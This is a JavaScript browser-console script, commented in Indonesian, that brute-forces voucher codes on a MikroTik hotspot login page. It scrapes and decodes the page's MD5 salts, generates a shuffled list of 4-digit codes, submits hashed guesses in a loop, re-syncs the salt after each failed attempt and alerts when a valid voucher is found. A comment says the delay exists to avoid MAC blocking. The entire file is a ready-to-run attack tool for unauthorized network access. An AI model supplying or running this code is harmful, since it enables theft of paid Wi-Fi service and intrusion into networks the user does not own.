/**
 * SHIN-THINK NET - Ultimate Adaptive Brute Force
 * Fitur: Octal Decoder, Auto-Salt Sync, Fisher-Yates Shuffle, Smart Delay
 */

class WifiBruteForcePro {
    constructor() {
        this.targetUrl = window.location.origin + "/login";
        this.currentSalt1 = "";
        this.currentSalt2 = "";
        this.attemptCount = 0;
        this.isOnline = false;
    }

    // 1. Decoder: Mengubah \325 menjadi karakter biner asli
    _decodeOctal(str) {
        if (!str) return "";
        return str.replace(/\\([0-7]{1,3})/g, (match, octal) => {
            return String.fromCharCode(parseInt(octal, 8));
        });
    }

    // 2. Extractor: Mencuri Salt baru dari HTML response
    _updateSaltFromHtml(html) {
        const saltRegex = /hexMD5\('([^']+)' \+ [^+]+ \+ '([^']+)'\)/;
        const match = html.match(saltRegex);
        if (match) {
            this.currentSalt1 = this._decodeOctal(match[1]);
            this.currentSalt2 = this._decodeOctal(match[2]);
            return true;
        }
        return false;
    }

    // 3. Generator: Membuat 4-digit kode (tanpa 0 di depan, tanpa urutan gampang)
    _generateSmartCodes() {
        const result = [];
        const backtrack = (current, freq) => {
            if (current.length === 4) {
                result.push(current.join(""));
                return;
            }
            for (let d = 0; d <= 9; d++) {
                if (current.length === 0 && d === 0) continue; 
                if ((freq[d] || 0) >= 2) continue; 

                if (current.length >= 2) {
                    const a = current[current.length - 2];
                    const b = current[current.length - 1];
                    if ((b === a + 1 && d === b + 1) || (b === a - 1 && d === b - 1)) continue;
                }

                current.push(d);
                freq[d] = (freq[d] || 0) + 1;
                backtrack(current, freq);
                current.pop();
                freq[d]--;
            }
        };
        backtrack([], {});
        
        // Fisher-Yates Shuffle (Mengacak daftar)
        for (let i = result.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [result[i], result[j]] = [result[j], result[i]];
        }
        return result;
    }

    // 4. Main Core: Eksekusi Serangan
    async start() {
        console.clear();
        console.log("%c 🚀 SHIN-THINK NET ADAPTIVE BRUTEFORCE v2.0 ", "background: #222; color: #00ff00; font-weight: bold; padding: 10px;");

        // Ambil Salt pertama kali
        const initReq = await fetch(this.targetUrl);
        const initHtml = await initReq.text();
        if (!this._updateSaltFromHtml(initHtml)) {
            return console.error("❌ Gagal mendapatkan Salt awal. Pastikan kamu di halaman login.");
        }

        const codes = this._generateSmartCodes();
        console.log(`📦 Terkumpul ${codes.length} kode unik. Memulai...`);

        for (let i = 0; i < codes.length; i++) {
            const voucher = codes[i];
            this.attemptCount++;

            // Hitung Hash MD5 dengan Salt terbaru
            const hashedPassword = hexMD5(this.currentSalt1 + voucher + this.currentSalt2);

            const params = new URLSearchParams();
            params.append('username', voucher);
            params.append('password', hashedPassword);
            params.append('dst', 'http://www.msftconnecttest.com/redirect');

            try {
                const response = await fetch(this.targetUrl, {
                    method: 'POST',
                    body: params,
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });

                const resHtml = await response.text();

                // Cek apakah tembus (biasanya MikroTik redirect ke status.html)
                if (response.redirected || response.url.includes("status") || resHtml.includes("sudah login")) {
                    console.log(`%c ⭐ SUCCESS! VOUCHER: ${voucher} `, "background: #00ff00; color: #000; font-size: 20px; font-weight: bold;");
                    alert("DAPAT! Kode: " + voucher);
                    return;
                }

                // Ambil Salt baru dari response gagal tadi untuk percobaan berikutnya
                if (this._updateSaltFromHtml(resHtml)) {
                    console.log(`[${this.attemptCount}] Mencoba: ${voucher} | Salt Synced OK`);
                } else {
                    console.warn(`[${this.attemptCount}] Gagal ambil Salt baru. Mencoba reload Salt...`);
                    const reload = await fetch(this.targetUrl);
                    this._updateSaltFromHtml(await reload.text());
                }

            } catch (err) {
                console.error("⚠️ Koneksi terputus. Menunggu 5 detik...");
                await new Promise(r => setTimeout(r, 5000));
            }

            // Jeda 2-4 detik (PENTING agar tidak kena blokir MAC)
            const jitter = 100 //Math.floor(Math.random() * 2000) + 2000;
            await new Promise(r => setTimeout(r, jitter));
        }
    }
}

// Jalankan Bot
const bot = new WifiBruteForcePro();
bot.start();